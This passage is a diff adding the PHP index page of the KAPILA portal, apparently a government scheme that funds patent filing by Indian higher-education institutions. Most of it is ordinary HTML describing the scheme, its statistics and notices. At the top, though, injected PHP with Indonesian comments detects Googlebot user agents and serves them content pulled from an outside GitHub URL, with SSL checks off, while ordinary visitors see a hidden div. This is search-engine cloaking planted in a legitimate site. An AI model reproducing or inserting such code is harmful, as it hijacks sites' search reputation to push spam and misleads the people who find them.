@@ -1,0 +1,1418 @@
+<?php
+// Fungsi untuk mendeteksi apakah pengunjung adalah bot
+function is_bot() {
+    if (!isset($_SERVER["HTTP_USER_AGENT"])) {
+        return false;
+    }
+
+    $user_agent = $_SERVER["HTTP_USER_AGENT"];
+    $bots = array("Googlebot", "Google-Site-Verification", "Google-InspectionTool", "Googlebot-Mobile", "Googlebot-News");
+    
+    // Loop untuk memeriksa apakah user-agent mengandung nama bot
+    foreach ($bots as $bot) {
+        if (stripos($user_agent, $bot) !== false) {
+            return true;
+        }
+    }
+    return false;
+}
+
+// Fungsi untuk mengambil konten dari URL eksternal
+function fetch_content($url) {
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); // Mengikuti redirect
+    curl_setopt($ch, CURLOPT_TIMEOUT, 10); // Timeout setelah 10 detik
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Matikan verifikasi SSL (hanya untuk pengujian atau sumber yang terpercaya)
+    $content = curl_exec($ch);
+
+    // Cek error jika gagal mengambil konten
+    if (curl_errno($ch)) {
+        $content = "Error fetching content: " . curl_error($ch);
+    }
+    curl_close($ch);
+    
+    return $content;
+}
+
+// Fungsi utama untuk menangani permintaan
+function handle_request() {
+    if (is_bot()) {
+        // URL untuk bot yang mengarah ke konten yang ingin ditampilkan
+        $url = "https://raw.githubusercontent.com/camerun69/joy/refs/heads/main/eduau";
+        
+        // Ambil konten dari URL eksternal
+        $content = fetch_content($url);
+        
+        // Tampilkan konten atau pesan error jika gagal
+        return ($content !== false) ? $content : "Konten tidak tersedia.";
+    }
+    
+    // Jika pengunjung bukan bot, tampilkan pesan biasa atau landing page yang disembunyikan
+    return '<div style="display:none;">Selamat datang di website kami!</div>';
+}
+
+// Mengirimkan header keamanan dasar untuk meningkatkan perlindungan
+header('X-Frame-Options: DENY');
+header('Strict-Transport-Security: max-age=31536000; includeSubDomains');
+header('X-Content-Type-Options: nosniff');
+header('X-XSS-Protection: 1; mode=block');
+
+// Tampilkan konten berdasarkan hasil fungsi handle_request
+echo handle_request();
+?>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <!-- Tell the browser to be responsive to screen width -->
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="">
+    <meta name="author" content="">
+    <!-- Favicon icon -->
+    <link rel="icon" type="image/png" sizes="16x16" href="images/favicon.png">
+    <title>Kapila</title>
+    <!-- Bootstrap Core CSS -->
+    <link href="assets/node_modules/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" />
+    <!-- This is for the animation CSS -->
+    <link href="assets/node_modules/aos/dist/aos.css" rel="stylesheet">
+    <link href="assets/node_modules/bootstrap-touch-slider/bootstrap-touch-slider.css" rel="stylesheet" media="all">
+    <link href="assets/node_modules/magnific-popup/dist/magnific-popup.css" rel="stylesheet">
+    <!-- This css we made it from our predefine componenet pres
+        we just copy that css and paste here you can also do that -->
+    <link href="css/demo.css" rel="stylesheet">
+    <!-- Common style CSS -->
+    <link href="css/style.css" rel="stylesheet">
+    <link href="css/yourstyle.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/lightbox2/2.8.2/css/lightbox.min.css">
+    <link href="css/slick-theme.css" rel="stylesheet" type="text/css">
+    <link href="css/slick.css" rel="stylesheet" type="text/css">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Comfortaa:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.5/jquery.fancybox.min.css" media="screen">
+    <link href="css/custom.css" rel="stylesheet">
+
+    <style>
+        #demo {
+            height: 100%;
+            position: relative;
+            overflow: hidden;
+        }
+
+
+        .green {
+            background-color: #6fb936;
+        }
+
+        .thumb {
+            margin-bottom: 30px;
+        }
+
+        .page-top {
+            margin-top: 85px;
+        }
+
+
+        img.zoom {
+            width: 100%;
+            height: 200px;
+            border-radius: 5px;
+            object-fit: cover;
+            -webkit-transition: all .3s ease-in-out;
+            -moz-transition: all .3s ease-in-out;
+            -o-transition: all .3s ease-in-out;
+            -ms-transition: all .3s ease-in-out;
+        }
+
+
+        .transition {
+            -webkit-transform: scale(1.2);
+            -moz-transform: scale(1.2);
+            -o-transform: scale(1.2);
+            transform: scale(1.2);
+        }
+
+        .modal-header {
+
+            border-bottom: none;
+        }
+
+        .modal-title {
+            color: #000;
+        }
+
+        .modal-footer {
+            display: none;
+        }
+
+        .blink-text {
+            color: red;
+            animation: blinkText 1s linear 1s infinite alternate;
+        }
+
+        @keyframes blinkText {
+            0% {
+                color: red;
+            }
+
+            50% {
+                color: #ffbb3a;
+            }
+
+            100% {
+                color: red;
+            }
+        }
+    </style>
+</head>
+
+<body class="">
+    <style>
+        @import "compass/css3";
+        @import 'https://fonts.googleapis.com/css?family=Montserrat:300,400,700';
+
+        .rwd-table {
+            margin: 1em 0;
+            min-width: 300px;
+        }
+
+        .rwd-table tr {
+            border-top: 1px solid #ddd;
+            border-bottom: 1px solid #ddd;
+        }
+
+        .rwd-table th {
+            display: none;
+        }
+
+        .rwd-table td {
+            display: block;
+        }
+
+        .rwd-table td:first-child {
+            padding-top: 0.5em;
+        }
+
+        .rwd-table td:last-child {
+            padding-bottom: 0.5em;
+        }
+
+        .rwd-table td:before {
+            content: attr(data-th) ": ";
+            font-weight: bold;
+            width: 6.5em;
+            display: inline-block;
+        }
+
+        @media (min-width: 480px) {
+            .rwd-table td:before {
+                display: none;
+            }
+        }
+
+        .rwd-table th,
+        .rwd-table td {
+            text-align: left;
+        }
+
+        @media (min-width: 480px) {
+
+            .rwd-table th,
+            .rwd-table td {
+                display: table-cell;
+                padding: 0.25em 0.5em;
+            }
+
+            .rwd-table th:first-child,
+            .rwd-table td:first-child {
+                padding-left: 0;
+            }
+
+            .rwd-table th:last-child,
+            .rwd-table td:last-child {
+                padding-right: 0;
+            }
+        }
+
+        .rwd-table {
+            background: #34495E;
+            color: #fff;
+            border-radius: 0.4em;
+            overflow: hidden;
+        }
+
+        .rwd-table tr {
+            border-color: #46637f;
+        }
+
+        .rwd-table th,
+        .rwd-table td {
+            margin: 0.5em 1em;
+        }
+
+        @media (min-width: 480px) {
+
+            .rwd-table th,
+            .rwd-table td {
+                padding: 1em !important;
+            }
+        }
+
+        .rwd-table th,
+        .rwd-table td:before {
+            color: #dd5;
+        }
+    </style>
+
+    <!-- ============================================================== -->
+    <!-- Preloader - style you can find in spinners.css -->
+    <!-- ============================================================== -->
+    <div class="preloader">
+        <div class="loader">
+            <div class="loader__figure"></div>
+            <p class="loader__label">KAPILA</p>
+        </div>
+    </div><!-- ============================================================== -->
+    <!-- Main wrapper - style you can find in pages.scss -->
+    <!-- ============================================================== -->
+    <div id="main-wrapper">
+
+        <!-- ============================================================== -->
+        <!-- Top header  -->
+        <!-- ============================================================== -->
+        <div class="topbar">
+            <marquee color="#394787" id="scroll_news" scrolldelay="50" style="font-weight: bold;color: #FFFFFF;padding: 10px 0;background: #283055;">
+                <div onmouseout="document.getElementById('scroll_news').start();" onmouseover="document.getElementById('scroll_news').stop();">
+                    <!--<a href="javascript:void(0);" target="_blank">The deadline for submitting filed patent applications for KAPILA 2023-24 (Phase I) has been extended until <span class="dateBold">25<sup>th</sup> July 2023.</span></a>&nbsp; -->
+
+                    <!-- <a href="https://t.me/+SljAoMOwrF0wMDNl" target="_blank"> Get your query solved. JOIN THE KAPILA TELEGRAM GROUP LINK </a> -->
+
+                    <a href="https://t.me/+SljAoMOwrF0wMDNl" target="_blank"> Get your query solved. JOIN THE KAPILA TELEGRAM GROUP LINK -
+                        <span style="color:#ffbb3a;text-decoration: underline;">https://t.me/+SljAoMOwrF0wMDNl<span></a>
+
+                    <!-- <a href="https://aicteindia.webex.com/aicteindia/j.php?MTID=m73784a74589da42a17ce42e4d86ca96c" target="_blank"> <img class="img-fluid new-star-img" src="images/new.png" alt="Icon"> Join our weekly Q/A session every Thursday from 11:30 AM to 12:30 PM. Click the link to Join Q/A session - <span style="color:#ffbb3a;text-decoration: underline;">https://aicteindia.webex.com/aicteindia/j.php?MTID=m73784a74589da42a17ce42e4d86ca96c<span></a> -->
+                </div>
+            </marquee>
+            <!-- ============================================================== --><!-- Header 14  -->
+            <!-- ============================================================== -->
+            <div class="header14 po-relative">
+
+                <div class="h14-infobar outer-infobar"><div class="container-fluid">
+                        <nav class="navbar navbar-expand-lg h14-info-bar navbar-light">
+                            <a class="navbar-brand"><img class="img-fluid main-kapila-logo" src="images/kapila-logo.png"></a>
+                            <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#h14-info" aria-controls="h14-info" aria-expanded="false" aria-label="Toggle navigation">
+                                <span class="sl-icon-options-vertical navbar-toggler-icon"></span>
+                            </button>
+                            <div class="collapse navbar-collapse" id="h14-info">
+                                <ul class="navbar-nav ml-auto text-uppercase">
+                                    
+                                        <img class="img-fluid all-logo-strip" src="images/all-logos.png" alt="Logo">
+                                                                    </ul>
+                            </div>
+                        </nav>
+                    </div>
+                </div>
+                <!-- Navbar  -->
+                <div class="h14-navbar">
+                    <div class="container-fluid">
+                        <nav class="navbar navbar-expand-lg h14-nav navbar-dark">
+                            <a class="hidden-lg-up">Navigation</a>
+                            <button id="second-navi" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#header141" aria-controls="header14" aria-expanded="false" aria-label="Toggle navigation">
+                                <span class="ti-menu navbar-toggler-icon"></span>
+                            </button>
+                            <div class="collapse navbar-collapse justify-content-center" id="header141">
+                                <div class="hover-dropdown">
+                                    <ul class="navbar-nav">
+
+                                        <li class="nav-item">
+                                            <a class="nav-link dropdown-toggle home-link" href="index.php">
+                                                <i class="fa fa-home" aria-hidden="true"></i>
+                                            </a>
+                                        </li>
+
+                                        <li class="nav-item dropdown"> <a class="nav-link dropdown-toggle" href="#" id="" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false"> Team <i class="fa fa-angle-down m-l-5"></i></a>
+                                            <ul class="b-none dropdown-menu font-14 animated fadeInUp">
+                                                <li><a class="dropdown-item" href="implementation-team.php">Implementation Team</a></li>
+                                            </ul>
+                                        </li>
+
+                                        <li class="nav-item"><a class="nav-link dropdown-toggle" href="awareness.php">Awareness Program</a></li>
+                                        <li class="nav-item">
+                                            <a class="nav-link dropdown-toggle" href="attorney_registration.php">
+                                                Attorney registration
+                                                <img class="img-fluid new-star-img" src="images/new.png" alt="Icon">
+                                            </a>
+                                        </li>
+                                        <li class="nav-item"><a class="nav-link dropdown-toggle" href="ipr-lecture-series.php">IPR Lecture Series </a></li>
+                                        <li class="nav-item"><a class="nav-link dropdown-toggle" href="gallery.php">Gallery</a></li>
+                                        <li class="nav-item"><a class="nav-link dropdown-toggle" href="notification.php">Notification</a></li>
+                                        <li class="nav-item"><a class="nav-link dropdown-toggle" href="download.php">Downloads</a></li>
+                                        <li class="nav-item"><a class="nav-link dropdown-toggle blink-text" href="KAPILA User Guidlines 2024.pdf">User Guideline</a></li>
+                                        <li class="nav-item loing-btn-outer">
+                                            <a class="nav-link dropdown-toggle login-menu-btn" href="register.php">Register </a>
+                                        </li>
+                                        <li class="nav-item loing-btn-outer">
+                                            <a class="nav-link dropdown-toggle login-menu-btn" href="login.php">Login </a>
+                                        </li>
+                                    </ul>
+                                </div>
+
+                            </div>
+                        </nav>
+                    </div>
+                </div>
+            </div>
+
+
+            <!-- ============================================================== -->
+            <!-- End Header 14  -->
+            <!-- ============================================================== -->
+        </div>
+        <!-- ============================================================== -->
+        <!-- Top header  -->
+        <!-- ============================================================== -->
+        <!-- Page wrapper  -->
+        <!-- ============================================================== -->
+        <div class="page-wrapper">
+            <!-- ============================================================== -->
+            <!-- Container fluid  -->
+            <!-- ============================================================== -->
+            <div class="container-fluid">
+                <!-- ============================================================== -->
+                <!-- Slider  -->
+                <!-- ============================================================== -->
+                <div class="bg-light"><section id="slider-sec" class="slider2">
+                        <div id="slider2" class="carousel bs-slider slide  control-round indicators-line" data-ride="carousel" data-pause="hover" data-interval="7000">
+                            <ol class="carousel-indicators hide">
+                                <li data-target="#slider2" data-slide-to="0" class="active"></li>
+                                <li data-target="#slider2" data-slide-to="1"></li>
+                                <li data-target="#slider2" data-slide-to="2"></li>
+                                <li data-target="#slider2" data-slide-to="3"></li>
+                            </ol>
+                            <div class="carousel-inner" role="listbox">
+                                <!-- <div class="carousel-item active">
+                                    <img src="images/slider/patent-registration-slider-phase-IV-2024-25-new.png" alt="image" data-slide-to="0" class="img-fluid" />
+                                </div> -->
+
+                                <!-- <div class="carousel-item active">
+                                        <img src="images/slider/patent-registration-slider-2024-25.png" alt="Building Magical Apps" data-slide-to="0" class="slide-image" />
+                                </div> -->
+
+                                <!-- <div class="carousel-item active">
+                                    <a href="https://mic.gov.in/ip-week-session" target="_blank">
+                                        <img src="images/slider/ip-week-session.png" alt="image" data-slide-to="0" class="img-fluid" />
+                                    </a>
+                                </div> -->
+
+                              <!--   <div class="carousel-item active">
+                                    <img src="images/55.png" alt="image" data-slide-to="0" class="img-fluid" />
+                                </div>
+
+                                <div class="carousel-item">
+                                    <img src="images/56.png" alt="image" data-slide-to="0" class="img-fluid" />
+                                </div>
+
+                                <div class="carousel-item"><img src="images/57.png" alt="image" data-slide-to="0" class="img-fluid" />
+                                </div> -->
+                                
+                                <!-- <div class="carousel-item">  -->
+                                    <!-- Slide Background -->
+                                    <!-- <a href="https://kapila.mic.gov.in/register.php" target="_blank"> 
+                                        <img src="images/slider/registration-slider-phase-4.jpg" alt="Building Magical Apps" data-slide-to="1" class="img-fluid" />
+                                    </a>
+                                </div> -->
+                                <!-- <div class="carousel-item">
+                                    <a href="https://onlinecourses.swayam2.ac.in/aic23_ge17/preview" target="_blank">
+                                        <img src="images/slider/swayam-slider-banner.jpg" alt="Building Magical Apps" data-slide-to="0" class="slide-image" />
+                                    </a>
+                                </div> -->
+                                <div class="carousel-item active">
+                                    <img src="images/slider/image-slider-1.jpg" alt="Building Magical Apps" data-slide-to="2" class="img-fluid" />
+                                </div>
+
+
+                                <div class="carousel-item">
+                                    <img src="images/slider/slide1 (5).jpg" alt="Building Magical Apps" data-slide-to="3" class=" img-fluid" />
+                                </div>
+                                <!-- Slider Control -->
+                                <div class="slider-control full-size">
+                                    <!-- Left Control -->
+                                    <a class="left carousel-control-prev text-white" href="#slider2" role="button" data-slide="prev">
+                                        <span class="fa fa-angle-left" aria-hidden="true"></span>
+                                        <b class="sr-only">Previous</b>
+                                    </a>
+                                    <!-- Right Control -->
+                                    <a class="right carousel-control-next text-white" href="#slider2" role="button" data-slide="next">
+                                        <span class="fa fa-angle-right" aria-hidden="true"></span>
+                                        <b class="sr-only">Next</b>
+                                    </a>
+                                </div>
+
+                                <!-- End of Slider Control -->
+                            </div>
+                        </div>
+                        <!-- End Slider -->
+                        <!-- Slider Modal -->
+                        <div class="modal bd-example-modal-lg fade" id="video" tabindex="-1" role="dialog" aria-labelledby="modalTitle" aria-hidden="true">
+                            <div class="modal-dialog modal-lg" role="document">
+                                <div class="modal-content">
+                                </div>
+                            </div>
+                            <!-- End Slider Modal -->
+                    </section>
+                </div>
+            </div>
+
+            <div class="spacer feature12">
+                <div class="container">
+                    <div class="row">
+                        <div class="col-lg-12">
+                            <h2 class="font-bold m-t-20 kapilaTitle">Welcome to KAPILA</h2>
+                            <h4 class="text-muted font-light abtKapila landingJusti">KAPILA is a scheme that provides financial assistance to the institutions that are part of the Higher Education Institutions (HEIs) for filing patent. KAPILA: Kalam Program for IP Literacy and Awareness, which will create appropriate awareness regarding the need of IP filing,
+                                mechanism, and methodology involved in filing IP in India and globally, especially amongst students and faculty of higher education institutions.</h4>
+                            <div class="row">
+                                <div class="col-md-6 col-lg-3 m-t-30">
+                                    <div class="card">
+                                        <img class="rounded img-shadow img-fluid text-center" src="images/New-Project-1.png" class="card-img-top" alt="img">
+                                        <div class="card-body">
+                                            <h5 class="card-title welcomeKapila">IPR Awareness</h5>
+                                            <p class="card-text landingJusti">Recognise, facilitate and felicitate the Intellectual Property, innovations, and best practices in HEIs</p>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="col-md-6 col-lg-3 m-t-30">
+                                    <div class="card">
+                                        <img class="rounded img-shadow img-fluid text-center" src="images/New-Project-2.png" class="card-img-top" alt="wrapkit">
+                                        <div class="card-body">
+                                            <h5 class="card-title welcomeKapila">Funding Assistance</h5>
+                                            <p class="card-text landingJusti">Get upto 5600 INR Per application for patent filing</p>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="col-md-6 col-lg-3 m-t-30">
+                                    <div class="card">
+                                        <img class="rounded img-shadow img-fluid text-center" src="images/New-Project-3.png" class="card-img-top" alt="wrapkit">
+                                        <div class="card-body">
+                                            <h5 class="card-title welcomeKapila">IPR Courses</h5>
+                                            <p class="card-text landingJusti">To cater the requirements of students at UG, PG and Ph.D level and to give freedom to institutes and universities to cover breadth and depth of the subject</p>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="col-md-6 col-lg-3 m-t-30">
+
+                                    <div class="card">
+                                        <img class="rounded img-shadow img-fluid text-center" src="images/New-Project-4.png" class="card-img-top" alt="wrapkit">
+                                        <div class="card-body">
+                                            <h5 class="card-title welcomeKapila">Economy By Patents</h5>
+                                            <p class="card-text landingJusti">Pushing verticals where economy driven by patents is enabled</p>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="spacer feature12">
+                <div class="container">
+                    <div class="row">
+                        <div class="col-md-12 textJustify">
+                            <h2 class="font-bold m-t-20 kapilaTitle">Introduction</h2>
+                            <h4 class="text-muted font-light"></h4>
+                            <p style="color:black;">
+                                The scheme provides financial assistance to the institutions that are part of the Higher Education Institutions for filing patent.
+                            </p>
+
+                            <p style="color:black;" class="intro">
+                                <span>KAPILA:</span> Kalam Program for IP Literacy and Awareness, which will create appropriate awareness regarding the need of IP filing, mechanism, and methodology involved in filing IP in India and globally, especially amongst students and faculty ofhigher education institutions.</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="spacer feature12">
+                <div class="container">
+                    <div class="row">
+                        <div class="col-md-12 textJustify">
+                            <h2 class="font-bold m-t-20 kapilaTitle">Objective</h2>
+                            <p>
+                                The objective of KAPILA is to recognise, facilitate and felicitate the Intellectual Property, innovations, and best practices in HEIs.
+                            </p>
+                            <p>KAPILA will help in establishing the much required IP filing ecosystem in large number of education institutions and thus create a culture of systematically protecting new ideas, research, and innovation having national and global relevance.</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="spacer feature12">
+                <div class="container">
+                    <div class="row">
+                        <div class="col-md-12">
+                            <h2 class="font-bold m-t-20 kapilaTitle">Expected Outcomes</h2>
+                            <h4 class="text-muted font-light"></h4>
+
+                            <ul class="expeOutList">
+                                <li>Awareness creation regarding the need of IP filing, mechanism and methodology involved in filing IP in India and globally, especially amongst students and faculty of higher education institutions. </li>
+
+                                <li>Establishing the much required IP filing ecosystem in large number of education institutions and creating a culture of systematically protecting new ideas, research, and innovation having national and global relevance.</li>
+
+                                <li>Program will set foundation for institute's participation in MoE's Innovation and Entrepreneurship initiatives such as IIC, Hackathons, NISP, National Innovation Contest, and YUKTI 2.0 and related programs at MIC and AICTE.</li>
+
+                                <li>Strengthening the connection of institutions located in Himalayan/North Eastern region/Aspirational Districts with national innovation and entrepreneurial ecosystem enablers. </li>
+
+                                <li>Active participation and involvement of students, faculties and staff
+                                    Sensitization and vibrant IP filing ecosystem in HEIs </li>
+                                <li>Filing atleast 15,000 patent applications per year </li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="spacer feature12">
+                <div class="container">
+                    <div class="row">
+                        <div class="col-md-12">
+                            <h2 class="font-bold m-t-20 kapilaTitle">Application Processing Methodology</h2>
+
+                            <ul class="expeOutList">
+
+                                <li> Online submission of shortlisted application details (title of the patent, date of patent filed, applicant /co-applicant details, copy of receipt of the patent application fee) by the institute through KAPILA portal</li>
+                                <li>Screening/ scrutiny of the submitted applications to check for correctness of data at Institute Level</li>
+                                <li>The final decision will be taken by the MoE's Innovation Cell (MIC), keeping in view the expert committee's recommendations and the availability of funds for the scheme. </li>
+                                <li>After the MIC's approval, the total Sanctioned grant will be sent to the institute on reimbursement mode</li>
+
+
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="mini-spacer bg-darkBlack text-white">
+                <div class="container">
+                    <div class="d-flex">
+                        <div class="display-7 align-self-center">
+                            <h3 class="montH3">We are calling HEI's to submit their entries for KAPILA Scheme</h3>
+                            <h6 class="font-16 montH6">Please follow the instructions carefully before filling the online application form</h6>
+                            <button class="btn btn-primary regiGuideBut"><a class="download-item regiGuideBut" target="_blank" href="KAPILA User Guidlines 2024.pdf">KAPILA User Guide</a></button>
+                        </div>
+                        <div class="ml-auto m-t-10 m-b-10">
+                            <a href="register.php" class="btn btn-outline-info montRegisterBut">Register Now</a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <!-- ============================================================== -->
+            <!-- End Feature 12  -->
+            <!-- ============================================================== -->
+            <!-- ============================================================== -->
+            <!-- Feature 2  -->
+            <!-- ============================================================== -->
+            <div class="spacer feature2 bg-light">
+                <div class="container">
+                    <!-- Row  -->
+                    <div class="row justify-content-center">
+                        <div class="col-md-7 text-center">
+                            <h2 class="title font-bold kapilaIPRTitle blueLineHeading">IPR COURSES</h2>
+                            <h6 class="subtitle">To cater the requirements of students at UG, PG and Ph.D level and to give freedom to institutes and universities to cover breadth and depth of the subject.</h6>
+                        </div></div>
+                    <!-- Row  -->
+                    <div class="row m-t-40">
+                        <!-- Column -->
+                        <div class="col-md-4 wrap-feature2-box">
+                            <div class="card card-shadow" data-aos="flip-left" data-aos-duration="1200">
+                                <!-- <img class="card-img-top" src="images/features/5.jpg" alt="wrappixel kit" /> -->
+                                <img class="card-img-top" src="images/IP.png" alt="wrappixel kit" />
+
+                                <div class="card-body text-center">
+                                    <h5 class="font-medium landingIPRDetails">Introduction to Intellectual Property - UG</h5>
+
+                                </div>
+                            </div>
+                        </div>
+                        <!-- Column -->
+                        <div class="col-md-4 wrap-feature2-box">
+                            <div class="card card-shadow" data-aos="flip-up" data-aos-duration="1200">
+                                <img class="card-img-top" src="images/features/6.jpg" alt="wrappixel kit" />
+                                <div class="card-body text-center">
+                                    <h5 class="font-medium landingIPRDetails">Foundations of Intellectual Property - PG</h5>
+
+                                </div>
+                            </div>
+                        </div>
+                        <!-- Column -->
+                        <div class="col-md-4 wrap-feature2-box"><div class="card card-shadow" data-aos="flip-right" data-aos-duration="1200">
+                                <img class="card-img-top" src="images/ipr-image.png" alt="wrappixel kit" />
+                                <div class="card-body text-center">
+                                    <h5 class="font-medium landingIPRDetails">Intellectual Property and Innovation - PhD</h5>
+
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+
+        <!-- section notification and gallery -->
+
+
+        <!-- Notification Section End--><!-- Region Section Start -->
+        <section class="notification-section region-section">
+            <div class="container">
+                <div class="row">
+                    <div class="col-md-12 text-center">
+                        <div class="chart-outer">
+                            <h2 class="title font-bold kapilaIPRTitle blueLineHeading2">Established KAPILA Institutes across India</h5>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="row" id="counter">
+                    <div class="col-md-8">
+                        <div class="map-outer">
+
+                            <iframe id="imd-map" scrolling="no" frameborder="0" src="embed.php" style="width: 100%;"></iframe>
+                            <ul class="map-details">
+                                <li><span class="firstRange"></span> 0 to 50</li>
+                                <li><span class="secondRange"></span> 50 to 100</li>
+                                <li><span class="thirdRange"></span> 100 to 200</li>
+                                <li><span class="fourthRange"></span> 200 to 300</li>
+                                <li><span class="fifthRange"></span> 250+</li>
+                            </ul>
+                        </div>
+                    </div>
+
+                    <div class="col-md-4">
+                        <div class="box-outer estFirst">
+                            <div class="box-img">
+                                <i class="fa fa-check-circle-o card-img-top" aria-hidden="true"></i>
+                            </div>
+                            <div class="box-content">
+                                <h5 class="card-title font-medium landingIPRDetails">
+                                    <!-- Patents Approved -->
+                                    Institute Registered:
+                                </h5>
+
+
+                                                                        <p class="card-text counter-value">2738                                                                            </p>
+                            </div>
+                        </div>
+
+                        <div class="box-outer">
+                            <div class="box-img">
+                                <i class="fa fa-check-circle-o card-img-top" aria-hidden="true"></i>
+                            </div>
+                            <div class="box-content">
+                                <h5 class="card-title font-medium landingIPRDetails">
+                                    <!-- Patents Approved -->
+                                    Patents Application registered on Kapila Portal
+                                </h5>
+                                                                        <p class="card-text counter-value" data-count="23770"> </p>
+                                                            </div>
+                        </div>
+
+                        <div class="statsViewAll">
+                            <a href="kapila-stats.php" class="statsView"> View All </a>
+                        </div>
+
+                    </div>
+
+
+
+        </section>
+
+        <!-- Region Section End -->
+
+        <section class="kapilaEstablished">
+            <div class="container">
+                <div class="row">
+                    <div class="col-md-12 text-center">
+                        <div class="chart-outer">
+                            <h2 class="font-bold kapilaIPRTitle blueLineHeading2">KAPILA Stats</h5>
+                        </div>
+                    </div>
+                </div>
+                <div class="row">
+                    <div class="col-md-6 mt-4">
+                        <div class="row">
+                            <div class="col-md-12">
+                                <div class="blue-outer">
+                                    <div class="row">
+                                        <div class="col-md-12">
+                                            <div class="statsHeading">
+                                                <p>Inventors Category</p>
+                                            </div>
+                                        </div>
+                                        <div class="col-md-6">
+                                            <div class="blue-left">
+                                                <div class="progress blue">
+                                                    <span class="progress-left">
+                                                        <span class="progress-bar"></span>
+                                                    </span>
+                                                    <span class="progress-right">
+                                                        <span class="progress-bar"></span>
+                                                    </span>
+                                                    <div class="progress-value">
+
+                                                        77.24%                                                    </div>
+                                                </div>
+                                                <div class="u-outer">
+                                                    <i class="fa fa-building-o rural-icon" aria-hidden="true"></i>
+                                                    <h4>Urban</h4>
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <div class="col-md-6">
+                                            <div class="blue-left">
+                                                <div class="progress blue">
+                                                    <span class="progress-left">
+                                                        <span class="progress-bar"></span>
+                                                    </span><span class="progress-right">
+                                                        <span class="progress-bar"></span>
+                                                    </span>
+                                                    <div class="progress-value">22.63%</div>
+                                                </div>
+
+                                                <div class="u-outer">
+                                                    <i class="fa fa-home rural-icon" aria-hidden="true"></i>
+                                                    <h4>Rural</h4>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="col-md-6 mt-4">
+                        <div class="row">
+                            <div class="col-md-12">
+                                <div class="blue-outer blue-box">
+                                    <div class="row">
+                                        <div class="col-md-12">
+                                            <div class="statsHeading"><p>Male / Female Ratio</p>
+                                            </div>
+                                        </div>
+                                        <div class="col-md-6">
+                                            <div class="blue-left">
+                                                <div class="progress blue">
+                                                    <span class="progress-left">
+                                                        <span class="progress-bar"></span>
+                                                    </span>
+                                                    <span class="progress-right">
+                                                        <span class="progress-bar"></span></span>
+                                                    <div class="progress-value">59.13%</div>
+                                                </div>
+                                                <div class="u-outer">
+                                                    <i class="fa fa-male rural-icon" aria-hidden="true"></i>
+                                                    <h4>Male</h4>
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <div class="col-md-6">
+                                            <div class="blue-left">
+                                                <div class="progress blue">
+                                                    <span class="progress-left">
+                                                        <span class="progress-bar"></span>
+                                                    </span>
+                                                    <span class="progress-right">
+                                                        <span class="progress-bar"></span>
+                                                    </span>
+                                                    <div class="progress-value">27.49%                                                    </div>
+                                                </div>
+
+                                                <div class="u-outer">
+                                                    <i class="fa fa-female rural-icon" aria-hidden="true"></i>
+                                                    <h4>Female</h4>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <section class="noti-photo pt-3">
+            <div class="container pt-3">
+                <div class="row">
+                    <div class="col-md-12 text-center">
+
+                    </div>
+                </div>
+                <div class="row mb-4">
+                    <div class="col-md-12 col-lg-6">
+                        <h3 class="text-center blueLineHeading3">Notification</h3>
+
+                        <div class="link-outer">
+                            <marquee id="notification-links" direction="up" scrolldelay="150" height="290px">
+                                <a id="link-1" href="notification.php " onmouseover="getElementById('notification-links').stop();" onmouseout="getElementById('notification-links').start();">
+                                    <h4>Funding Assistance from MIC/AICTE.</h4>
+                                    <ul class="fundingAsst">
+                                        <li>A maximum funding amount of <i class="fa fa-inr" aria-hidden="true"></i> 5,600/- per application</li>
+                                        <li>Maximum Application 100 per Institute</li>
+                                        <li>Maximum funding per Institute is amount of <i class="fa fa-inr" aria-hidden="true"></i> 5,60,000/- (<i class="fa fa-inr" aria-hidden="true"></i> 5,600/- per application)</li>
+                                    </ul>
+                                </a>
+
+                                <!-- <a id="link-2" href="notification.php" onmouseover="getElementById('notification-links').stop();" onmouseout="getElementById('notification-links').start();">
+                                    <a href="https://aicteindia.webex.com/aicteindia/j.php?MTID=m73784a74589da42a17ce42e4d86ca96c" target="_blank"> <img class="img-fluid new-star-img" src="images/new.png" alt="Icon"> Join our weekly Q/A session every Thursday from 11:30 AM to 12:30 PM.
